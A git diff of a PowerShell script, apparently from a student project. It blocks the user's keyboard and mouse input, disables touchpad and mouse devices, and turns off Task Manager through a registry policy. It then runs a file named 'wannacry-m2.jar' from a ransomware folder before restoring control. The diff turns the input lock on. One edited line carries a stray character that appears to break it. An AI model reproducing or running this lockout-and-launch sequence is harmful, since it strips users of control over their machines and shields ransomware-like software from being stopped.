@@ -15,13 +15,12 @@ $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInp
 # 	$userInput::BlockInput($false)
 # }
 Add-Type -AssemblyName System.Windows.Forms
-$userInput::BlockInput($false)
-
-get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -match "*touchpad*" || $_.FriendlyName -match "*mouse*"} | Disable-PnpDevice -confirm:$false
+$userInput::BlockInput($true)
+get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -Match "*touchpad*" -or $_.FriendlyName -Match "*mouse*" -} | Disable-PnpDevice -confirm:$false
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 C:\Users\leoti\Documents\m2\projet_minientreprise\scripts\m2_minientreprise_scripts\scripts\ressources\ransomware\wannacry-m2.jar
 Start-Sleep -seconds 5
-get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -match "*touchpad*" || $_.FriendlyName -match "*mouse*"} | Enable-PnpDevice -confirm:$false
+get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -Match "*touchpad*" -or $_.FriendlyName -Match "*mouse*"} | Enable-PnpDevice -confirm:$false
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
 $userInput::BlockInput($false)
 # Stop-Process -Id $PID
